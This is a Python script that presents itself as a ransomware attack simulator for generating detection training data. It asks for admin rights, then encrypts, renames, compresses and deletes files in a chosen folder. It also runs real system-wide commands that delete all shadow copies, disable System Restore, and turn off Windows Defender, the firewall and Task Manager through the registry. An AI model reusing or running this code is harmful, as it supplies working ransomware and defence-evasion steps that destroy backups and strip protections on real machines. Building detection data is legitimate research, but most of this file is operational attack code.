"""
Decription:     An all in one injector for ransomware attack simulation.
Author:         Nadir Hussain
Dated:          Jan 25, 2025
"""
import os
import time
import random
import string
import json
from dotenv import load_dotenv

# Packages for encryption, and decryption of data
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

# For compress files
from shutil import make_archive, rmtree

# For changing system permissions
from stat import S_IWRITE, S_IREAD, S_IRWXU, S_IRWXG, S_IRWXO

# For registry edits, shadow copy and restore point operations
import subprocess

# For running this injector with admin level previliges
import ctypes
import sys

# for cpu, memory and other resource details
import psutil

# garbage collector to clean memory when it exceeds vm limit
import gc

# Allow user to select directory to be monitored
import tkinter as tk
from tkinter import filedialog

# Metadata for encryption and renaming, goal is to get original names back upon decryption
METADATA_FILE = "metadata.json"

# In-memory metadata for tracking operations: i.e we don't encrypt same file twice, because the goal is to be able to decrypt files back, in return of payment/ransom
file_metadata = {}  

# Directory under attack, we could do this for whole system but injector encrypts files, and we don't want to encrypt systems files or other critical data on our system
WORKING_DIR = None
def select_directory():
    root = tk.Tk()
    root.withdraw()  # Hide main window
    directory = filedialog.askdirectory(title="Select Directory to Monitor")
    return directory

"""Check if the script is running with administrative privileges."""
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

"""Get random string, useful for folder names, file renames"""
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

"""Save files' meta info i.e name, path to a JSON file."""
def save_metadata():
    with open(METADATA_FILE, "w") as f:
        json.dump(file_metadata, f)

"""Loads metadata from a JSON file."""
def load_metadata():
    global file_metadata
    if os.path.exists(METADATA_FILE):
        with open(METADATA_FILE, "r") as f:
            file_metadata = json.load(f)

"""Ensures the original file is tracked in metadata."""
def ensure_original_file(filepath):
    if filepath not in file_metadata:
        file_metadata[filepath] = {
            "original_name": filepath,
            "encrypted": False,
            "renamed": False,
            "is_original": True
        }


"""Creates a new text file with random content."""
def create_file(directory):
    try:
        filename = os.path.join(directory, f"{random_string()}.txt")
        with open(filename, 'w') as f:
            # Create a medium file with 100 to 500 lines
            for _ in range(int(random.uniform(100, 500))):  
                f.write(random_string(int(random.uniform(50, 100))) + '\n')
        print(f"Created: {filename}")
        ensure_original_file(filename)
        save_metadata()
        return filename
    except Exception as e:
        print(f"Error creating file: {e}")

"""Create a folder and populate it with random files."""
def create_folder(directory):
    try:
        folder_name = os.path.join(directory, f"folder_{random_string()}")
        os.makedirs(folder_name)
        print(f"Created folder: {folder_name}")

        # Create random files inside the folder
        for _ in range(random.randint(1, 5)):  # Create 1-5 files
            create_file(folder_name)

        return folder_name
    except Exception as e:
        print(f"Error creating folder: {e}")

"""Rename a file to a random name."""
def rename_file(filepath):
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or metadata["renamed"]:
            print(f"Skipping renaming for: {filepath}")
            return filepath

        new_name = f"{random_string()}_{os.path.basename(filepath)}"
        new_path = os.path.join(os.path.dirname(filepath), new_name)
        os.rename(filepath, new_path)

        # Update metadata for reversibility
        file_metadata[new_path] = file_metadata.pop(filepath)
        file_metadata[new_path]["renamed"] = True
        save_metadata()
        print(f"Renamed: {filepath} -> {new_path}")
        return new_path
    except Exception as e:
        print(f"Error renaming {filepath}: {e}")
        return filepath

"""Encrypt a file using AES-256. The choice of algo is based on its complexity to decrypt, means we should not be able to decrypt files if we don't have key"""
def encrypt_file(filepath):
    mem = psutil.virtual_memory()
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or metadata["encrypted"]:
            print(f"Skipping encryption for: {filepath}")
            return

        key = os.urandom(32)  # 256-bit key
        iv = os.urandom(16)   # 128-bit IV

        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Add PKCS7 padding
        padder = padding.PKCS7(128).padder()  # 128-bit block size for AES
        padded_data = padder.update(file_data) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Create an encrypted filename with a `.encrypted` extension
        encrypted_filename = f"{filepath}.encrypted"
        with open(encrypted_filename, 'wb') as f:
            # For simplicity, we append key within file itself. In real, this key is with attacker, who reveals when payment is paid
            f.write(key + iv + encrypted_data)

        # Update metadata for decryption
        file_metadata[encrypted_filename] = {
            "original_name": filepath,
            "encrypted": True,
            "renamed": metadata.get("renamed", False),
            "is_original": metadata.get("is_original", True)
        }

        del file_metadata[filepath]
        os.remove(filepath)
        save_metadata()
        print(f"Encrypted: {encrypted_filename} (AES-256)")
        mem = psutil.virtual_memory()

    except MemoryError as e:
        mem = psutil.virtual_memory()

    except Exception as e:
        mem = psutil.virtual_memory()
        print(f"Error encrypting {filepath}: {e}")


"""Encrypt all files in a directory, including existing ones."""
def encrypt_all_files(directory):
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if not file.endswith(".encrypted"):
                    encrypt_file(file_path)
    except Exception as e:
        print(f"Error encrypting all files: {e}")

"""Decrypt a single file back to its original state."""
def decrypt_file(filepath):
    try:
        metadata = file_metadata.get(filepath)
        if not metadata or not metadata["encrypted"]:
            print(f"Skipping decryption for: {filepath}")
            return

        with open(filepath, 'rb') as f:
            file_data = f.read()

        # For simplicity, we appended key within file itself. In real, this key is with attacker, who reveals when payment is paid
        # Extract key, IV, and encrypted data
        key = file_data[:32]
        iv = file_data[32:48]
        encrypted_data = file_data[48:]

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remove PKCS7 padding
        unpadder = padding.PKCS7(128).unpadder()
        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

        original_name = metadata["original_name"]
        with open(original_name, 'wb') as f:
            f.write(decrypted_data)

        os.remove(filepath)
        save_metadata()
        print(f"Decrypted: {filepath} -> {original_name}")

        # Update metadata
        del file_metadata[filepath]
        file_metadata[original_name] = {
            "original_name": original_name,
            "encrypted": False,
            "renamed": metadata.get("renamed", False),
            "is_original": metadata.get("is_original", True)
        }
        save_metadata()
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")


def decrypt_all_files(directory):
    """Decrypt all encrypted files in the directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            decrypt_file(filepath)

"""
Compress a folder or all root-level files in the working directory.
If target_path is a folder, compress it and replace the folder with a .zip file. If target_path is the WORKING_DIR, compress all root-level files into root_files.zip.
"""
def compress(target_path):
    try:
        if os.path.isdir(target_path):
            # Compress a folder
            archive_name = f"{target_path}.zip"
            make_archive(target_path, 'zip', target_path)
            rmtree(target_path)  # Remove the original folder after compression
            print(f"Compressed folder: {target_path} -> {archive_name}")
        elif target_path == WORKING_DIR:
            # Compress all root-level files
            root_files = [
                os.path.join(WORKING_DIR, f)
                for f in os.listdir(WORKING_DIR)
                if os.path.isfile(os.path.join(WORKING_DIR, f))
            ]
            if root_files:
                archive_name = os.path.join(WORKING_DIR, "root_files.zip")
                make_archive(archive_name.replace('.zip', ''), 'zip', WORKING_DIR)
                for file in root_files:
                    os.remove(file)  # Delete the original root-level files
                print(f"Compressed root files to {archive_name}")
            else:
                print("No root-level files to compress.")
        else:
            print(f"Invalid path: {target_path}")
    except Exception as e:
        print(f"Error during compression: {e}")


"""Change the timestamps of a file."""
def change_timestamps(filepath):
    try:
        new_time = time.mktime((2020, 1, 1, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59), 0, 0, 0))
        os.utime(filepath, (new_time, new_time))
        print(f"Timestamps changed for: {filepath}")
    except Exception as e:
        print(f"Error changing timestamps for {filepath}: {e}")


"""Delete multiple random files, excluding original files. Note that original files are not deleted during ransomware attack, ethically those has to be decrypted or recovered when ransom is paid by the victim"""
def bulk_delete():
    try:
        files = [f for f in file_metadata if not file_metadata[f].get("is_original", False)]
        if files:
            files_to_delete = random.sample(files, min(len(files), random.randint(1, 5)))
            for file in files_to_delete:
                os.remove(file)
                print(f"Deleted: {file}")
                del file_metadata[file]
        save_metadata()
    except Exception as e:
        print(f"Error during bulk delete: {e}")
        
"""Change file permissions to simulate user/admin access."""
def change_permission(filepath, to_admin=False):
    try:
        if to_admin:
            os.chmod(filepath, S_IRWXU | S_IRWXG | S_IRWXO)  # Full access
        else:
            os.chmod(filepath, S_IREAD | S_IWRITE)  # Read-only
        print(f"Permissions changed for: {filepath} (Admin: {to_admin})")
    except Exception as e:
        print(f"Error changing permissions for {filepath}: {e}")

"""Shadow copies store the user's data as backup, ransomware removes them at start"""
def disable_shadow_copies():
    try:
        print("Simulating shadow copy deletion...")
        if not is_admin():
            raise PermissionError("Operation requires elevated permissions. Please rerun the script as an administrator.")
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=True)
    except PermissionError as e:
        print(f"Error: {e}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to delete shadow copies: {e}")
    except Exception as e:
        print(f"Error during shadow copy deletion: {e}")

"""Disabling system restore. Restore points are checkoints, that user can revert back to them, used specifically if user installed an update on system (typically an infected updated), and everything gets infected. so ransomware deletes restore points so user can't go back"""
def disable_system_restore():
    try:
        print("Simulating disabling system restore...")
        if not is_admin():
            raise PermissionError("Operation requires elevated permissions.")
        subprocess.run(["powershell", "-Command", r"Disable-ComputerRestore -Drive C:\\"], check=True)
    except PermissionError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Error disabling system restore: {e}")

"""Registry of system contains info about firewall, defender, task manager, so we typically disable all of them so user can't figure out what is hapenning"""
def modify_registry():
    try:
        print("Updating registry records...")

        # Disable Windows Defender
        subprocess.run([
            "reg", "add", r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender",
            "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"
        ], check=True)
        print("Windows Defender disabled.")

        # Disable Windows Firewall (add keys if they don't exist)
        firewall_keys = [
            r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile",
            r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile"
        ]

        for key in firewall_keys:
            subprocess.run([
                "reg", "add", key, "/v", "EnableFirewall", "/t", "REG_DWORD", "/d", "0", "/f"
            ], check=True)
        print("Windows Firewall disabled.")

        # Disable Task Manager (create the System subkey if it doesn't exist)
        subprocess.run([
            "reg", "add", r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
            "/f"
        ], check=True)
        subprocess.run([
            "reg", "add", r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
            "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"
        ], check=True)
        print("Task Manager disabled.")

    except Exception as e:
        print(f"Error modifying registry: {e}")

"""
This is core of injector, that runs operations in ordered + random way
"""
def inject_operations(duration=180):
    
    # Load metadata at the start
    load_metadata()  

    # Ensure all files, including root-level, are tracked
    for root, _, files in os.walk(WORKING_DIR):
        for file in files:
            ensure_original_file(os.path.join(root, file))

    start_time = time.time()

    # one time operations: typically, a ransomware disables and modifies these at start of its execution
    disable_shadow_copies()
    disable_system_restore()
    modify_registry()

    # injector has 4 variants. 3 (I1, I2, I3) are used of injections i.e on which system is labelled as anomolous. While I4 is used to inject normal behaior. This makes sure that system is not sensitive to few operations, and should not produce False Positives.
    I1 = [
        "create_file", "create_folder", "rename_file", "encrypt_file",
        "encrypt_all_files",
        "compress_folder", "bulk_delete", "change_timestamps",
        "change_permission"
    ]

    I2 = [
        "create_file", "create_folder", "rename_file", "encrypt_file",
        "encrypt_all_files",
        "compress_folder", "bulk_delete"
    ]

    I3 = [
        "create_file", "rename_file", "encrypt_file",
        "encrypt_all_files"
    ]

    I4 = [
        "encrypt_file"
    ]

    gc.collect()
    memory_threshold = 85  


    while time.time() - start_time < duration:
        
        # In virtual machine, when memory reaches to its limit, the script halts so to prevent that, and waits for 5 seconds to continue
        mem = psutil.virtual_memory()
        if mem.percent > memory_threshold:
            print(f"Memory usage critical: {mem.percent}%. Pausing operations.")
            time.sleep(5)
            continue

        operation = random.choice(I1) # we just need to change injector types here, for varying behavior. For Ix, the operation is chosen on random. In case of I4, only 1 operation is there

        try:
            if operation == "create_file":
                create_file(WORKING_DIR)

            elif operation == "create_folder":
                folder = create_folder(WORKING_DIR)
                if random.choice([True, False]):  # Randomly encrypt folder content
                    encrypt_all_files(folder)

            elif operation == "rename_file":
                files = [
                    f for f in file_metadata
                    if not file_metadata[f]["renamed"]
                ]
                if files:
                    rename_file(random.choice(files))

            elif operation == "encrypt_file":
                files = [
                    f for f in file_metadata
                    if not file_metadata[f]["encrypted"]
                ]
                if files:
                    encrypt_file(random.choice(files))

            elif operation == "encrypt_all_files":
                encrypt_all_files(WORKING_DIR)

            elif operation == "compress_folder":
                folders = [
                    os.path.join(WORKING_DIR, d)
                    for d in os.listdir(WORKING_DIR)
                    if os.path.isdir(os.path.join(WORKING_DIR, d))
                ]
                if folders:
                    compress(random.choice(folders))

            elif operation == "bulk_delete":
                bulk_delete()

            elif operation == "change_timestamps":
                files = [
                    os.path.join(WORKING_DIR, f)
                    for f in os.listdir(WORKING_DIR)
                    if os.path.isfile(os.path.join(WORKING_DIR, f))
                ]
                if files:
                    change_timestamps(random.choice(files))

            elif operation == "change_permission":
                files = [
                    os.path.join(WORKING_DIR, f)
                    for f in os.listdir(WORKING_DIR)
                    if os.path.isfile(os.path.join(WORKING_DIR, f))
                ]
                if files:
                    change_permission(random.choice(files), to_admin=random.choice([True, False]))

        except Exception as e:
            print(f"Error during {operation}: {e}")

        # Random delay between operations 0.5 to 2 seconds for I1, I2, I3. 2 to 3 seconds for I4
        time.sleep(random.uniform(0.5, 1.5))  
    save_metadata()

if __name__ == "__main__":
    try:
        if not is_admin():
            print("Requesting administrative privileges...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            
            sys.exit()

        # Get directory from user
        WORKING_DIR = select_directory()
        if not WORKING_DIR:
            print("No directory selected. Exiting...")
            sys.exit()

        action = input("Enter 'inject' to inject ransomware or 'decrypt' to decrypt files: ").strip().lower()
        if action == 'inject':
            inject_operations(duration=60)
        elif action == 'decrypt':
            load_metadata()
            decrypt_all_files(WORKING_DIR)
        else:
            print("Invalid action. Please enter 'inject' or 'decrypt'.")
    except Exception as e:
        input("Error occurred. Check logs. Press Enter to exit.")